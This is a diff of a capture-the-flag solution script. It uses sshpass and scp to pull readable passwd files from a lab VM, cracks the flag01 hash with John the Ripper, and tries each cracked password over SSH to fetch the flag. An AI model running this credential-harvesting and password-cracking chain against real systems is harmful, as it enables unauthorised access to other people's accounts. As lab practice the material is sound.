@@ -9,8 +9,8 @@ FLAG=../flag
 # Connect to the virtual machine using SSH and run the script
 # to find every `passwd` file that can be read by the user `level01`
 READABLE_PASSWD_FILES=$(
-	sshpass -f ${PREVIOUS_FLAG} \
-		ssh -p ${PORT} level01@${ADDRESS} 'sh -s' <find_readable_passwd_files.sh 2>/dev/null
+	sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
+		ssh -p ${PORT} level01@${ADDRESS} 'sh -s' <find_readable_passwd_files.sh
 )
 
 rm -rf ~/.john
@@ -21,8 +21,8 @@ for READABLE_PASSWD_FILE in ${READABLE_PASSWD_FILES}; do
 	)
 
 	# Copy the `passwd` file from the virtual machine to the host + set its permissions
-	sshpass -f ${PREVIOUS_FLAG} \
-		scp -P ${PORT} level01@${ADDRESS}:${READABLE_PASSWD_FILE} ${LOCAL_FILE} 2>/dev/null
+	sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
+		scp -P ${PORT} level01@${ADDRESS}:${READABLE_PASSWD_FILE} ${LOCAL_FILE}
 	chmod 600 ${LOCAL_FILE}
 
 	# Keep only the line(s) of the `flag01` account
@@ -38,8 +38,8 @@ for READABLE_PASSWD_FILE in ${READABLE_PASSWD_FILES}; do
 	for POTENTIAL_PASSWORD in ${POTENTIAL_PASSWORDS}; do
 		# Try to connect to the `flag00` account
 		if
-			sshpass -p ${POTENTIAL_PASSWORD} \
-				ssh -p ${PORT} flag01@${ADDRESS} "getflag | grep -oE '[^ ]+$'" >${FLAG} 2>/dev/null
+			sshpass -p ${POTENTIAL_PASSWORD} >${FLAG} 2>/dev/null \
+				ssh -p ${PORT} flag01@${ADDRESS} "getflag | grep -oE '[^ ]+$'"
 		then
 			# Found the correct password and saved the flag
 			rm -rf ${TMP}
